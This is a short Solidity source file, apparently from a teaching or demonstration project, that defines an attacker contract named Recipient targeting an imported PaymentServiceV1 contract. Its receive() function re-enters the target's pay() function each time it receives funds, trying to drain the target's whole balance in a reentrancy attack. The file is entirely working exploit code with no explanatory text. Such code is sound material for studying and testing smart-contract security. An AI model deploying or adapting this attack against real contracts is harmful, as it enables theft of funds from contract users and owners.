pragma solidity ^0.8.0;

import "../protagonist/PaymentServiceV1.sol";

contract Recipient {

    PaymentServiceV1 contractToAttack;

    constructor(PaymentServiceV1 _contractToAttack) {
        contractToAttack = _contractToAttack;
    }

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    receive() external payable {
        uint256 _balance = address(contractToAttack).balance;
        if (_balance > msg.value) {
            contractToAttack.pay(address(this), _balance);
        }
    }
}